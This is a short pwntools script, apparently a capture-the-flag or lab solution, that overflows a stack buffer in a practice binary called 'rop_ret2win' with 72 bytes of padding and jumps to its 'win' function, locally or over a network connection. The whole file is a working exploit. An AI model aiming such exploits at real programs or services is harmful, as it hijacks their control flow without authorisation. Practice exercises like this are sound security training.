#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./build/rop_ret2win", checksec=False)
context.log_level = "info"

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 1337)

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = process(elf.path, stdin=PIPE, stdout=PIPE)

offset = 72
payload = flat(
    b"A" * offset,
    elf.symbols["win"],
)

io.sendlineafter(b"Send your payload:\n", payload)
out = io.recvall(timeout=2)
print(out.decode(errors="ignore"))
